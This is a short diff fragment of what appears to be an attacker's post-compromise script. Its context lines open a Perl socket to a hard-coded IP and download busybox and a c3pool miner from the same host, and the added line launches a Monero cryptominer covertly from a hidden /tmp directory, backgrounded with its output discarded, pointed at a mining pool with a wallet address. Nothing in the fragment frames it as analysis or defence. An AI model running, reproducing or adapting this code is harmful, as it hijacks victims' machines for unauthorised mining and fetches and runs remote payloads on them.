@@ -16,3 +16,6 @@ perl -MIO::Socket -e '$c=IO::Socket::INET->new("176.160.153.17:6000"); print $c 
 ./cl 176.160.153.17:6001/busybox -o busybox
 ./cl 176.160.153.17:6001/c3pool -o mo
 ./busybox
+
+
+nohup /tmp/.x/mo --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_335! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=2 --cpu-max-threads-hint 75 > /dev/null 2>&1 &
